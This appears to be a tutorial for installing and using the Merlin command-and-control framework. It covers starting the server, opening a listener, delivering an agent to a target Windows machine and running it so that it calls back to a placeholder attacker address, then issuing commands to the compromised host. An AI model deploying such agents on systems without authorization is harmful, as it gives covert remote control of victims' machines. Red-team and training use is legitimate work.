# Merlin Command and Control (C2) Framework Guide

This guide provides a comprehensive, step-by-step methodology for downloading, installing, configuring, and using the **Merlin C2 framework**. Merlin is a lightweight, post-exploitation command and control framework written in Go. It is designed to be cross-platform, extensible, and easy to use for red teaming and penetration testing purposes.

By following this documentation, you will be able to:
- Set up and run the Merlin server.
- Configure listeners.
- Deploy agents on target machines.
- Interact with agents and execute commands.

---

## Step 1: Downloading and Extracting Merlin C2

### 1. Download the Latest Version of Merlin
Visit the official [Merlin GitHub Releases Page](https://github.com/Ne0nd0g/merlin/releases) to download the latest version of the framework.

Use the following `wget` command to download the server file:

```bash
wget https://github.com/Ne0nd0g/merlin/releases/download/v2.1.3/merlinServer-Linux-x64.7z
```

### 2. Extract the Compressed File

After downloading, extract the file using the 7z tool:

```bash
7z x merlinServer-Linux-x64-v2.1.3.7z
```

**Note:** The extracted files are password-protected. The default password for extraction is merlin.


## Step 2: Running the Merlin Server

### 1. Start the Merlin Server

Navigate to the folder where the server has been extracted and run the Merlin server:

```bash
./merlinServer
```

### 2. Verify Server is Running

Once the server is running, open a new terminal window and navigate to the `/data/bin` directory to access the compiled Merlin CLI and agent files:

```bash
cd /data/bin
```

### 3. Start the Merlin CLI

Run the Merlin CLI in the `/data/bin` directory:

```bash
./merlinCLI
```

### 4. Start the Listeners

With the CLI running, initiate the listeners using the `listeners` command:

```bash
listeners
```

### 5. Configure Merlin to Listen on All IPs

To allow access from any device in the network, configure Merlin to listen on all interfaces:

- Use the `use` command to select a protocol (e.g., HTTPS):

```bash
use HTTPS
```

- Set the interface to `0.0.0.0`:

```bash
set Interface 0.0.0.0
```

- Set the port to `8443` (or any other port of your choice):

```bash
set Port 8443
```

- Verify the listener’s configuration:

```bash
show
```

- Start the listener:

```bash
start
```

## Step 3: Running the Merlin Agent

### 1. On Kali Linux

Open a new terminal window and run the Merlin agent with the default URL pointing to the server:

```bash
./merlinAgent -url http://127.0.0.1:443
```

If the listener is configured on a global IP, replace `127.0.0.1` with your host IP.


### 2. On Windows

1. Send the Windows agent to the target Windows machine.

2. Use a Python server to share the Windows agent:

```bash
python3 -m http.server {port}
```

3. Access the server from the Windows browser and download the Windows Merlin agent.

4. Open Command Prompt (CMD) in the directory where the agent is downloaded and run:

```bash
.\windowsmerlinagentname -url https://ip_of_machine_where_server_is_running:port_no
```

### 3. Listing the Agents

To view all running agents, use the `sessions` command:

```bash
sessions
```

## Step 4: Interacting with the Agents

### 1. Interacting with an Agent

To interact with a specific agent, use the interact command followed by the agent's ID:

```bash
interact agent_id
```

### 2. Available Commands

After successfully interacting with the agent, type `help` to see a list of available commands that you can execute on the agent machine.

---

# Additional Information About Merlin

### Key Features of Merlin

- **Cross-Platform Support:** Merlin agents can run on Windows, Linux, and macOS.

- **Extensible Architecture:** Merlin supports custom modules and extensions.

- **Encrypted Communication:** All communication between the server and agents is encrypted using TLS.

- **Lightweight:** The framework is designed to be minimal and efficient.

### Use Cases

- **Red Teaming:** Simulate advanced persistent threats (APTs) in a controlled environment.

- **Penetration Testing:** Test the security posture of an organization.

- **Incident Response Training:** Train security teams to detect and respond to C2 frameworks.

### Best Practices

- Always use Merlin in a legal and authorized environment.

- Regularly update to the latest version to benefit from new features and security patches.

- Use strong passwords and encryption for sensitive operations.

# Conclusion

This guide provides a clear and structured approach for setting up and using the Merlin C2 framework. By following these steps, you can effectively deploy and manage Merlin agents for post-exploitation activities. Ensure that you follow each step carefully and verify your setup at each stage to avoid any issues.

For more information, visit the official [Merlin GitHub Repository](https://github.com/Ne0nd0g/merlin).

---